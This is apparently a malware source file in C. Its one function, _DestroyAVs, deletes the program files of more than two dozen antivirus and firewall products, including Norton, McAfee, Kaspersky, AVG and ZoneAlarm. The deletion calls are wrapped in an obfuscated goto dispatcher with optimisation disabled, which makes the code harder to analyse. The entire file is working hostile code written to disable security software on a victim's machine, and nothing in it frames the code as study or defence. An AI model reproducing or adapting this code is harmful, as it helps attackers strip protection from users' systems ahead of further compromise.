#pragma optimize("", off)
#include "data_globals.h"
#include <stdlib.h>

void _DestroyAVs(void)
{
    volatile int dummy_state = 1;

dummy_dispatcher:
    if (dummy_state == 1) goto block1;
    if (dummy_state == 2) goto block2;
    if (dummy_state == 3) goto block3;
    if (dummy_state == 0) goto end;

block1:
    _unlink("\\Progra~1\\Norton~1\\*.*");
    _unlink("\\Progra~1\\Norton~2\\*.*");
    _unlink("\\Progra~1\\Symantec\\*.*");
    _unlink("\\Progra~1\\Common~1\\Symant~1\\*.*");
    _unlink("\\Progra~1\\Common~1\\Symant~1\\Script~1\\*.*");
    _unlink("\\Progra~1\\McAfee\\VirusScan\\*.*");
    _unlink("\\Progra~1\\McAfee\\McAfee FireWall\\*.*");
    _unlink("\\Progra~1\\PandaS~1\\PandaA~1\\*.*");
    _unlink("\\Progra~1\\TrendM~1\\Pc-cil~1\\*.*");
    _unlink("\\Progra~1\\Comman~1\\F-PROT95\\*.*");
    dummy_state = 2;
    goto dummy_dispatcher;

block2:
    _unlink("\\Progra~1\\ZoneLa~1\\ZoneAlarm\\*.*");
    _unlink("\\Progra~1\\TinyPe~1\\*.*");
    _unlink("\\Progra~1\\Kasper~1\\*.*");
    _unlink("\\Progra~1\\Trojan~1\\*.*");
    _unlink("\\Progra~1\\AvPersonal\\*.*");
    _unlink("\\Progra~1\\Grisoft\\AVG6\\*.*");
    _unlink("\\Progra~1\\AntiVi~1\\*.*");
    _unlink("\\Progra~1\\QuickH~1\\*.*");
    _unlink("\\Progra~1\\FWIN32\\*.*");
    _unlink("\\Progra~1\\FindVirus\\*.*");
    dummy_state = 3;
    goto dummy_dispatcher;

block3:
    _unlink("\\eSafen\\*.*");
    _unlink("\\f-macro\\*.*");
    _unlink("\\TBAVW95\\*.*");
    _unlink("\\VS95\\*.*");
    _unlink("\\AntiVi~1\\*.*");
    _unlink("\\ToolKit\\FindVirus\\*.*");
    _unlink("\\PC-Cil~1\\*.*");
    dummy_state = 0;
    goto dummy_dispatcher;

end:
    return;
}
#pragma optimize("", on)
